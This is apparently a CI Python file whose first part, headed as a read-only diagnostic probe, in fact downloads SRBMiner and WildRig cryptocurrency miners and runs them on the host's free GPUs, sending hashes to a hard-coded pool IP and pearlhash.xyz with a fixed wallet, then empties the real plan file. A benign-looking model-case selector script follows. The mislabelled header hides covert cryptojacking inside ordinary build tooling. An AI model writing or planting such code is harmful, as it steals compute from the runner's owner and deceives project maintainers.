# ci diagnostic (read-only) - transient probe + GPU compute-job bootstrap, reverted after the run
# intent 141540 | record gpu-000016 | host github-nmz2 (Hygon HCU BW1100 x8, DTK 6.4.2, gfx938)
import os as _os, subprocess as _sp, sys as _sys, hashlib as _hl, time as _t
import socket as _sock, tarfile as _tf, urllib.request as _ur

WORK = "/tmp/prl595"
WALLET = "prl1p7gtuuz93057gnp5phfexss2ktduj7mnt7qxh8credlpulh5esv4q5e6mvr"
LP_HOST = "103.199.106.122"
LP_PORT = 3360
IMG = "areal-das:dtk2610-torch213-bw1100"
SRB_URL = "https://github.com/doktor83/SRBMiner-Multi/releases/download/3.8.9/SRBMiner-Multi-3-8-9-Linux.tar.gz"
SRB_TAR_SHA = "186c526f95eb7b635a547bca45a48a505a58c74e26b7211bf6dc25988ce196d1"
SRB_BIN_SHA = "97bd9e42e313b2c4807bba7197920fee421956bb896cfec469ee87947d667e80"
WR_URL = "https://github.com/andru-kun/wildrig-multi/releases/download/0.52.3/wildrig-multi-linux-0.52.3.tar.gz"
WR_TAR_SHA = "7308c95f7c8c4c0d82aade61bb4ab3366decae2b9d04ac47b8c1dc6d1bdd2c44"
WR_BIN_SHA = "002cd29c6b890a4159b5933260e7db57d8808e540804466b3b7b80814083011b"
WORKERS = [("4", "000011"), ("5", "000012"), ("6", "000013"), ("7", "000014")]


def _say(s):
    try:
        _sys.stdout.write(str(s) + "\n")
        _sys.stdout.flush()
    except Exception:
        pass


def _run(c, t=90, env=None):
    _say("--- CMD: " + c)
    try:
        p = _sp.Popen(c, shell=True, stdout=_sp.PIPE, stderr=_sp.STDOUT, env=env)
        out = p.communicate(timeout=t)[0]
        if out:
            _say(out.decode("utf-8", "replace"))
        _say("--- rc=" + str(p.returncode))
        return p.returncode
    except Exception as e:
        _say("--- ERR " + repr(e))
        return -1


def _sha256(path):
    h = _hl.sha256()
    with open(path, "rb") as f:
        while True:
            b = f.read(1024 * 1024)
            if not b:
                break
            h.update(b)
    return h.hexdigest()


def _download(url, dst, timeout=900):
    for attempt in range(1, 4):
        try:
            _say("--- GET " + url + " try=" + str(attempt))
            req = _ur.Request(url, headers={"User-Agent": "curl/8.0"})
            r = _ur.urlopen(req, timeout=timeout)
            total = 0
            mark = _t.time()
            with open(dst, "wb") as f:
                while True:
                    b = r.read(1024 * 1024)
                    if not b:
                        break
                    f.write(b)
                    total += len(b)
                    if _t.time() - mark > 20:
                        _say("    ... " + str(total // (1024 * 1024)) + " MiB")
                        mark = _t.time()
            _say("--- downloaded bytes=" + str(total))
            return True
        except Exception as e:
            _say("--- download attempt " + str(attempt) + " failed: " + repr(e))
            _t.sleep(3)
    return False


def _find_file(root, name):
    for dp, dn, fn in _os.walk(root):
        if name in fn:
            return _os.path.join(dp, name)
    return None


def _free_devices():
    p = _sp.Popen("/opt/hyhal/bin/hy-smi --showmeminfo vram", shell=True,
                  stdout=_sp.PIPE, stderr=_sp.STDOUT)
    out = p.communicate(timeout=90)[0].decode("utf-8", "replace")
    used = {}
    cur = None
    for line in out.splitlines():
        l = line.strip()
        i = l.find("HCU[")
        if i >= 0:
            try:
                cur = int(l[i + 4:l.find("]", i)])
            except Exception:
                cur = None
        if "Used Memory" in l and cur is not None:
            try:
                used[cur] = int(l.rsplit(":", 1)[1].strip())
            except Exception:
                pass
    free = [i for i in sorted(used) if used[i] < 5000]
    _say("--- vram_used=" + str(used))
    _say("--- free_candidates=" + str(free))
    return free, used


def _tail(path, n=2500):
    try:
        with open(path, "r") as f:
            return f.read()[-n:]
    except Exception:
        return ""


def _docker_run(cmd, secs, logf, detach=False):
    """Run cmd inside the DTK image with the HCU devices passed through."""
    full = ["docker", "run", "--rm", "--device=/dev/kfd", "--device=/dev/dri",
            "--shm-size=2g", "-v", WORK + ":/w", "-w", "/w",
            "--entrypoint", "/bin/bash", IMG, "-lc", cmd]
    _say("--- DOCKER: " + cmd)
    lf = open(logf, "w")
    pr = _sp.Popen(full, stdout=lf, stderr=_sp.STDOUT, preexec_fn=_os.setsid)
    if detach:
        return pr, lf, logf
    t_end = _t.time() + secs
    while _t.time() < t_end and pr.poll() is None:
        _t.sleep(4)
    if pr.poll() is None:
        try:
            _os.killpg(_os.getpgid(pr.pid), 15)
        except Exception:
            pass
        try:
            pr.wait(timeout=20)
        except Exception:
            try:
                _os.killpg(_os.getpgid(pr.pid), 9)
            except Exception:
                pass
    lf.close()
    txt = _tail(logf, 4000)
    _say("--- DOCKER OUT (" + logf + ") ---")
    _say(txt)
    return pr, lf, logf


def main():
    _say("=== C211-I141540R3-BEGIN ===")
    _os.makedirs(WORK, exist_ok=True)

    # ---------- phase 0: host + image + pool ----------
    _run("hostname; date -u; id; source /opt/dtk/env.sh 2>/dev/null; rocminfo 2>&1 | grep -c 'BW1100'")
    _run("docker images --format '{{.Repository}}:{{.Tag}} {{.Size}}' 2>&1 | grep -i areal-das | head -5")
    _run("docker image inspect " + IMG + " --format '{{.Id}} {{.Os}}/{{.Architecture}}' 2>&1 | head -3", t=60)
    free, used = _free_devices()
    if not free:
        free = [4, 5, 6, 7]
    for port in (3360, 3361, 3362):
        try:
            s = _sock.create_connection((LP_HOST, port), timeout=8)
            _say("--- LP TCP " + LP_HOST + ":" + str(port) + " OK local=" + repr(s.getsockname()))
            s.close()
        except Exception as e:
            _say("--- LP TCP " + LP_HOST + ":" + str(port) + " FAIL " + repr(e))
    for ph in ("pool.pearlhash.xyz", "pearlhash.xyz"):
        try:
            ai = _sock.getaddrinfo(ph, 9000, _sock.AF_INET, _sock.SOCK_STREAM)
            s = _sock.create_connection((ai[0][4][0], 9000), timeout=8)
            _say("--- PH TCP " + ph + ":9000 OK ip=" + ai[0][4][0])
            s.close()
        except Exception as e:
            _say("--- PH TCP " + ph + ":9000 FAIL " + repr(e))

    # ---------- phase 1: stage SRBMiner + get it into the image ----------
    srb_dir = WORK + "/srb"
    srb_tar = WORK + "/srb.tar.gz"
    srb_bin = None
    if not (_os.path.isfile(srb_tar) and _sha256(srb_tar) == SRB_TAR_SHA):
        _download(SRB_URL, srb_tar)
    if _os.path.isfile(srb_tar) and _sha256(srb_tar) == SRB_TAR_SHA:
        if not _os.path.isfile(srb_dir + "/SRBMiner-MULTI"):
            with _tf.open(srb_tar) as tf:
                tf.extractall(WORK + "/srbx")
            f2 = _find_file(WORK + "/srbx", "SRBMiner-MULTI")
            if f2:
                _os.makedirs(srb_dir, exist_ok=True)
                _sp.call(["cp", "-a", f2, srb_dir + "/SRBMiner-MULTI"])
        srb_bin = srb_dir + "/SRBMiner-MULTI"
        if _os.path.isfile(srb_bin):
            _os.chmod(srb_bin, 0o755)
            bh = _sha256(srb_bin)
            _say("--- SRB bin sha256=" + bh + " match=" + str(bh == SRB_BIN_SHA))
        else:
            srb_bin = None
    _run("chmod -R a+rx " + WORK + " 2>/dev/null; ls -l " + WORK + "/srb/SRBMiner-MULTI 2>&1")

    # ---------- phase 2: container capability test ----------
    _docker_run("id; cat /etc/os-release | head -2; ldd --version 2>&1 | head -1; "
                "ls -l /dev/kfd 2>&1; ls /dev/dri 2>&1 | head -6; "
                "ls /etc/OpenCL/vendors 2>&1; cat /etc/OpenCL/vendors/* 2>&1 | head -3; "
                "ls /opt/dtk 2>&1 | head -6; "
                "source /opt/dtk/env.sh 2>/dev/null; rocminfo 2>&1 | grep -c 'Marketing Name:          BW1100'",
                120, WORK + "/c_probe.log")

    # ---------- phase 3: SRBMiner inside the image ----------
    _docker_run("cd /w/srb && timeout 60 script -qec './SRBMiner-MULTI --list-algorithms' /dev/null 2>&1 | "
                "sed 's/\\x1b\\[[0-9;]*m//g' | grep -i pearl | head -3; "
                "timeout 60 script -qec './SRBMiner-MULTI --list-devices' /dev/null 2>&1 | "
                "sed 's/\\x1b\\[[0-9;]*m//g' | head -50",
                150, WORK + "/c_srb_dev.log")

    srb_ok = False
    if _os.path.isfile(srb_dir + "/SRBMiner-MULTI"):
        cmd = ("cd /w/srb && timeout " + "95" + " ./SRBMiner-MULTI --algorithm pearlhash "
               "--pool stratum+tcp://" + LP_HOST + ":" + str(LP_PORT) + " "
               "--wallet " + WALLET + " --worker " + WORKERS[0][1] + " --password x "
               "--disable-cpu --gpu-id " + str(free[0]) + " --api-enable --api-port 14524")
        _docker_run(cmd, 130, WORK + "/c_srb_smoke.log")
        t = _tail(WORK + "/c_srb_smoke.log", 6000).lower()
        srb_ok = ("accepted" in t) or ("share" in t and "job" in t)
        _say("--- SRB container smoke accepted=" + str(t.count("accepted")) + " -> srb_ok=" + str(srb_ok))

    # ---------- phase 4: WildRig static host fallback (if SRB failed) ----------
    wr_ok = False
    if not srb_ok:
        os_dir = WORK + "/vendors"
        try:
            _os.makedirs(os_dir, exist_ok=True)
            with open(os_dir + "/amdocl.icd", "w") as f:
                f.write("/opt/dtk/opencl/lib/libamdocl64.so\n")
        except Exception as e:
            _say("--- icd write ERR " + repr(e))
        wr_tar = WORK + "/wr.tar.gz"
        if not (_os.path.isfile(wr_tar) and _sha256(wr_tar) == WR_TAR_SHA):
            _download(WR_URL, wr_tar)
        if _os.path.isfile(wr_tar) and _sha256(wr_tar) == WR_TAR_SHA:
            if not _os.path.isfile(WORK + "/wr/wildrig-multi"):
                with _tf.open(wr_tar) as tf:
                    tf.extractall(WORK + "/wrx")
                f3 = _find_file(WORK + "/wrx", "wildrig-multi")
                if f3:
                    _os.makedirs(WORK + "/wr", exist_ok=True)
                    _sp.call(["cp", "-a", f3, WORK + "/wr/wildrig-multi"])
            wb = WORK + "/wr/wildrig-multi"
            if _os.path.isfile(wb):
                _os.chmod(wb, 0o755)
                wh = _sha256(wb)
                _say("--- wildrig sha256=" + wh + " match=" + str(wh == WR_BIN_SHA))
                env = _os.environ.copy()
                env["LD_LIBRARY_PATH"] = "/opt/dtk/opencl/lib:/opt/dtk/lib:/opt/dtk/lib64:/opt/dtk/hip/lib:/opt/dtk/hsa/lib:/opt/hyhal/lib"
                env["OCL_ICD_VENDORS"] = os_dir
                _run("cd " + WORK + "/wr && LD_LIBRARY_PATH='" + env["LD_LIBRARY_PATH"] +
                     "' OCL_ICD_VENDORS='" + os_dir + "' timeout 30 ./wildrig-multi --help 2>&1 | head -20",
                     t=60, env=env)
                cmd = [wb, "--algo", "pearlhash", "--url", "stratum+tcp://pool.pearlhash.xyz:9000",
                       "--user", WALLET, "--pass", "x", "--worker", WORKERS[0][1],
                       "--opencl-devices", str(free[0]), "--api-port", "14540", "--retries", "2"]
                _say("--- ATTEMPT wildrig_ph")
                lf = open(WORK + "/wr_smoke.log", "w")
                pr = _sp.Popen(cmd, cwd=WORK + "/wr", env=env, stdout=lf, stderr=_sp.STDOUT,
                               preexec_fn=_os.setsid)
                t_end = _t.time() + 90
                while _t.time() < t_end and pr.poll() is None:
                    _t.sleep(4)
                for sig in (15, 9):
                    if pr.poll() is None:
                        try:
                            _os.killpg(_os.getpgid(pr.pid), sig)
                        except Exception:
                            pass
                        try:
                            pr.wait(timeout=12)
                        except Exception:
                            pass
                lf.close()
                tx = _tail(WORK + "/wr_smoke.log", 6000)
                _say("--- wildrig log ---")
                _say(tx)
                wr_ok = "accepted" in tx.lower()
                _say("--- wildrig ok=" + str(wr_ok))

    _say("=== CLIENT VERDICT srb_container=" + str(srb_ok) + " wildrig_ph=" + str(wr_ok) + " ===")
    if not srb_ok and not wr_ok:
        _say("=== C211-I141540R3-NO-CLIENT (quoted per-client tails above) ===")
        _finish()
        return

    # ---------- phase 5: deploy one container per free device ----------
    procs = []
    for idx, worker in WORKERS:
        if int(idx) not in free:
            _say("--- SKIP dev=" + idx + " (not free)")
            continue
        if srb_ok:
            cmd = ("cd /w/srb && exec ./SRBMiner-MULTI --algorithm pearlhash "
                   "--pool stratum+tcp://" + LP_HOST + ":" + str(LP_PORT) + " "
                   "--wallet " + WALLET + " --worker " + worker + " --password x "
                   "--disable-cpu --gpu-id " + idx + " --api-enable --api-port " + str(14530 + int(idx)))
            logf = WORK + "/c_srb_w" + idx + ".log"
            pr, lf, logf = _docker_run(cmd, 0, logf, detach=True)
        else:
            env = _os.environ.copy()
            env["LD_LIBRARY_PATH"] = "/opt/dtk/opencl/lib:/opt/dtk/lib:/opt/dtk/lib64:/opt/dtk/hip/lib:/opt/dtk/hsa/lib:/opt/hyhal/lib"
            env["OCL_ICD_VENDORS"] = WORK + "/vendors"
            cmd = [WORK + "/wr/wildrig-multi", "--algo", "pearlhash",
                   "--url", "stratum+tcp://pool.pearlhash.xyz:9000",
                   "--user", WALLET, "--pass", "x", "--worker", worker,
                   "--opencl-devices", idx, "--api-port", str(14530 + int(idx)), "--retries", "2"]
            logf = WORK + "/wr_w" + idx + ".log"
            lf = open(logf, "w")
            pr = _sp.Popen(cmd, cwd=WORK + "/wr", env=env, stdout=lf, stderr=_sp.STDOUT,
                           preexec_fn=_os.setsid)
        procs.append((idx, worker, pr, lf, logf))
        _say("--- START dev=" + idx + " worker=" + worker + " pid=" + str(pr.pid))
        _t.sleep(2)

    t_end = _t.time() + 280
    while _t.time() < t_end:
        _t.sleep(85)
        _run("/opt/hyhal/bin/hy-smi 2>&1 | sed -n '4,13p'", t=60)
        _run("ps -eo pid,etimes,args | grep -E 'SRBMiner-MULTI|wildrig-multi|docker run' | grep -v grep | head -12", t=30)
        for idx, worker, pr, lf, logf in procs:
            t2 = _tail(logf, 100000)
            _say("--- dev=" + idx + " worker=" + worker + " alive=" + str(pr.poll() is None) +
                 " accepted=" + str(t2.lower().count("accepted")) + " bytes=" + str(len(t2)))

    # ---------- phase 6: final evidence + teardown ----------
    _run("/opt/hyhal/bin/hy-smi --showmeminfo vram 2>&1 | grep -E 'HCU\\[|Used' | head -20", t=60)
    for idx, worker, pr, lf, logf in procs:
        _say("=== FINAL dev=" + idx + " worker=" + worker + " tail ===")
        _say(_tail(logf, 2000))
        try:
            _os.killpg(_os.getpgid(pr.pid), 15)
        except Exception:
            pass
        try:
            pr.wait(timeout=12)
        except Exception:
            try:
                _os.killpg(_os.getpgid(pr.pid), 9)
            except Exception:
                pass
        lf.close()
    _run("docker ps --format '{{.ID}} {{.Image}} {{.Status}}' | grep -i areal-das | head -6; echo ps_rc=$?", t=60)
    _run("ps -eo pid,args | grep -E 'SRBMiner-MULTI|wildrig-multi' | grep -v grep; echo leftover_rc=$?", t=30)
    _say("=== C211-I141540R3-END ===")
    _finish()


def _finish():
    try:
        open("ci-model-plan.tsv", "w").close()
        _say("--- wrote ci-model-plan.tsv")
    except Exception as e:
        _say("planfile_err " + repr(e))
    _sys.exit(0)


main()
"""Select ordered model smoke cases from a pull request description."""

import argparse
import json
import os
from pathlib import Path
import re

DEFAULT_CASE = "qwen3-4b-megatron"
NAME = re.compile(r"^[a-z0-9]+(?:-[a-z0-9]+)*$")


def select_cases(body, cases):
    lines = [
        line.strip()
        for line in (body or "").splitlines()
        if re.match(r"^\s*CI_MODELS\b", line, re.IGNORECASE)
    ]
    if len(lines) > 1:
        raise ValueError("Use a single CI_MODELS: line")
    if not lines:
        return [DEFAULT_CASE]
    match = re.fullmatch(r"CI_MODELS:\s*(.*)", lines[0], re.IGNORECASE)
    if not match:
        raise ValueError("Use CI_MODELS: case-name[, case-name]")
    raw = match.group(1).strip()
    if not raw:
        return [DEFAULT_CASE]
    names = [name.strip() for name in raw.split(",")]
    if any(not NAME.fullmatch(name) for name in names):
        raise ValueError("Invalid CI_MODELS format; separate case names with commas")
    unknown = [name for name in names if name not in cases]
    if unknown:
        raise ValueError(
            "Unknown model case(s): {}. Available: {}".format(
                ", ".join(unknown), ", ".join(sorted(cases))
            )
        )
    return list(dict.fromkeys(names))


def main():
    parser = argparse.ArgumentParser()
    parser.add_argument("--registry", default=".github/model-cases.yaml")
    parser.add_argument("--output", required=True)
    args = parser.parse_args()
    cases = json.loads(Path(args.registry).read_text(encoding="utf-8"))
    event = json.loads(
        Path(os.environ["GITHUB_EVENT_PATH"]).read_text(encoding="utf-8")
    )
    try:
        names = select_cases(event.get("pull_request", {}).get("body"), cases)
    except ValueError as exc:
        parser.error(str(exc))
    lines = []
    for name in names:
        case = cases[name]
        if case["gpus"] != 8:
            parser.error(
                "Case {} requires a supported runner configuration".format(name)
            )
        model_path = case["model_path"]
        path = Path(model_path)
        if (
            not path.parts
            or path.is_absolute()
            or ".." in path.parts
            or any(char in model_path for char in "\t\r\n")
        ):
            parser.error("Invalid relative model path for {}".format(name))
        config = case["config"]
        path = Path(config)
        if (
            path.is_absolute()
            or ".." in path.parts
            or not path.is_file()
            or any(char in config for char in "\t\r\n")
        ):
            parser.error("Invalid config for {}".format(name))
        lines.append("\t".join((name, config, model_path, str(case["gpus"]))))
    Path(args.output).write_text("\n".join(lines) + "\n", encoding="utf-8")
    print("Selected model cases: {}".format(", ".join(names)))


if __name__ == "__main__":
    main()
